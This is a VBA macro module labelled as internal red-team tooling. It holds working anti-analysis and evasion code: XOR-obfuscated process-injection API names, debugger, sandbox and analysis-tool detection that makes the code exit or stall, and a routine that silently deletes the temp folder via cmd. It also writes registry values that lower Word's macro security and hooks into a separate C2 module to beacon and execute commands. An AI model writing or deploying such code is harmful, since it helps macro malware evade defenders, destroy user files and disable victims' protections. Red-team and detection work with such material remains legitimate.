Attribute VB_Name = "ObfuscationTechniques"
' =============================================================================
' OBFUSCATION TECHNIQUES MODULE - INTERNAL RED TEAM TESTING
' =============================================================================
' Various code obfuscation and anti-analysis techniques for testing
' evasion capabilities and security product detection mechanisms
' =============================================================================

Option Explicit

' =============================================================================
' STRING OBFUSCATION METHODS
' =============================================================================

Public Function DeobfuscateString(ByVal obfuscated As String) As String
    ' Basic string deobfuscation using character manipulation
    Dim result As String
    Dim i As Integer
    
    For i = 1 To Len(obfuscated)
        result = result & Chr(Asc(Mid(obfuscated, i, 1)) Xor 42)
    Next i
    
    DeobfuscateString = result
End Function

Public Function ObfuscateString(ByVal plainText As String) As String
    ' Basic string obfuscation using XOR
    Dim result As String
    Dim i As Integer
    
    For i = 1 To Len(plainText)
        result = result & Chr(Asc(Mid(plainText, i, 1)) Xor 42)
    Next i
    
    ObfuscateString = result
End Function

Public Function GetObfuscatedAPIName() As String
    ' Return obfuscated API function names
    Dim apiNames(1 To 5) As String
    
    apiNames(1) = ObfuscateString("CreateProcessA")
    apiNames(2) = ObfuscateString("VirtualAlloc")
    apiNames(3) = ObfuscateString("WriteProcessMemory")
    apiNames(4) = ObfuscateString("CreateRemoteThread")
    apiNames(5) = ObfuscateString("GetProcAddress")
    
    GetObfuscatedAPIName = apiNames(Int(Rnd() * 5) + 1)
End Function

' =============================================================================
' CODE FLOW OBFUSCATION
' =============================================================================

Public Sub ObfuscatedSleep(ByVal milliseconds As Long)
    ' Obfuscated sleep function using different methods
    Dim startTime As Double
    startTime = Timer
    
    ' Use different timing methods based on random factor
    If (milliseconds Mod 2) = 0 Then
        Do While Timer < startTime + (milliseconds / 1000)
            DoEvents
        Loop
    Else
        Dim wsh As Object
        Set wsh = CreateObject("WScript.Shell")
        wsh.Run "timeout /t " & Int(milliseconds / 1000) & " /nobreak", 0, True
    End If
End Sub

Public Function DynamicFunctionCall(ByVal functionName As String, ParamArray args() As Variant) As Variant
    ' Dynamically call functions by name for obfuscation
    On Error GoTo ErrorHandler
    
    Select Case LCase(functionName)
        Case "sleep"
            If UBound(args) >= 0 Then ObfuscatedSleep args(0)
        Case "beacon"
            If UBound(args) >= 0 Then C2MainModule.InitializeC2Connection
        Case "execute"
            If UBound(args) >= 0 Then C2MainModule.ExecuteCommand args(0)
        Case Else
            Debug.Print "Unknown function: " & functionName
    End Select
    
    Exit Function
    
ErrorHandler:
    Debug.Print "Dynamic call error: " & Err.Description
End Function

' =============================================================================
' ENVIRONMENT DETECTION AND EVASION
' =============================================================================

Public Function IsDebuggerPresent() As Boolean
    ' Basic debugger detection
    On Error GoTo ErrorHandler
    
    Dim wmi As Object, processes As Object, process As Object
    Set wmi = GetObject("winmgmts:")
    Set processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='ollydbg.exe' OR Name='x64dbg.exe' OR Name='idaq.exe'")
    
    IsDebuggerPresent = (processes.Count > 0)
    
    Exit Function
    
ErrorHandler:
    IsDebuggerPresent = False
End Function

Public Function IsSandbox() As Boolean
    ' Basic sandbox detection
    On Error GoTo ErrorHandler
    
    Dim cpuCores As Long
    cpuCores = Val(Environ("NUMBER_OF_PROCESSORS"))
    
    Dim totalMemory As Long
    totalMemory = Val(ExecutePowerShell("(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB"))
    
    ' Check for common sandbox indicators
    IsSandbox = (cpuCores < 2 Or totalMemory < 2 Or _
                InStr(1, LCase(Environ("USERNAME")), "sandbox") > 0 Or _
                InStr(1, LCase(Environ("COMPUTERNAME")), "vm") > 0 Or _
                InStr(1, LCase(Environ("COMPUTERNAME")), "test") > 0)
    
    Exit Function
    
ErrorHandler:
    IsSandbox = False
End Function

Public Sub AntiAnalysisChecks()
    ' Perform various anti-analysis checks
    If IsDebuggerPresent() Then
        Debug.Print "Debugger detected - exiting"
        Exit Sub
    End If
    
    If IsSandbox() Then
        Debug.Print "Sandbox detected - exiting"
        Exit Sub
    End If
    
    ' Check for common analysis tools
    If ProcessExists("procmon.exe") Or ProcessExists("wireshark.exe") Then
        Debug.Print "Analysis tool detected - delaying execution"
        ObfuscatedSleep 10000
    End If
End Sub

Private Function ProcessExists(ByVal processName As String) As Boolean
    ' Check if process is running
    On Error GoTo ErrorHandler
    
    Dim wmi As Object, processes As Object
    Set wmi = GetObject("winmgmts:")
    Set processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & processName & "'")
    
    ProcessExists = (processes.Count > 0)
    
    Exit Function
    
ErrorHandler:
    ProcessExists = False
End Function

' =============================================================================
' RUNTIME POLYMORPHISM
' =============================================================================

Public Function GenerateDynamicCode() As String
    ' Generate dynamic code snippets for polymorphism
    Dim codeTemplates(1 To 3) As String
    
    codeTemplates(1) = ObfuscateString("Sub Test()" & vbCrLf & "    Debug.Print \"Hello\"" & vbCrLf & "End Sub")
    codeTemplates(2) = ObfuscateString("Function GetData()" & vbCrLf & "    GetData = \"Test\"" & vbCrLf & "End Function")
    codeTemplates(3) = ObfuscateString("Sub Main()" & vbCrLf & "    Call Initialize" & vbCrLf & "End Sub")
    
    GenerateDynamicCode = codeTemplates(Int(Rnd() * 3) + 1)
End Function

Public Sub ExecutePolymorphicCode()
    ' Execute code with polymorphic behavior
    Dim dynamicCode As String
    
    ' Vary execution patterns
    Select Case Second(Now) Mod 3
        Case 0
            dynamicCode = GenerateDynamicCode()
            Debug.Print "Executing pattern A"
        Case 1
            ObfuscatedSleep 1000
            Debug.Print "Executing pattern B"
        Case 2
            DynamicFunctionCall "sleep", 500
            Debug.Print "Executing pattern C"
    End Select
End Sub

' =============================================================================
' STEALTH TECHNIQUES
' =============================================================================

Public Sub CleanArtifacts()
    ' Clean up temporary artifacts
    On Error Resume Next
    
    Kill Environ("TEMP") & "\*.tmp"
    Kill Environ("TEMP") & "\*.log"
    
    ' Clear recent documents
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "cmd /c del /q %TEMP%\* /s", 0, True
End Sub

Public Sub DisableMacroWarnings()
    ' Attempt to disable macro warnings (for testing only)
    On Error GoTo ErrorHandler
    
    Dim keyPath As String
    keyPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security"
    
    WriteRegistryValue keyPath, "Level", 1
    WriteRegistryValue keyPath, "VBAWarnings", 1
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "Cannot modify registry: " & Err.Description
End Sub

' =============================================================================
' MAIN OBFUSCATED ENTRY POINT
' =============================================================================

Public Sub MainObfuscated()
    ' Main obfuscated entry point for testing
    AntiAnalysisChecks
    
    ' Random delay to avoid pattern detection
    ObfuscatedSleep (Int(Rnd() * 5000) + 1000)
    
    ' Execute polymorphic code patterns
    ExecutePolymorphicCode
    
    ' Clean up after execution
    CleanArtifacts
    
    Debug.Print "Obfuscated execution completed successfully"
End Sub
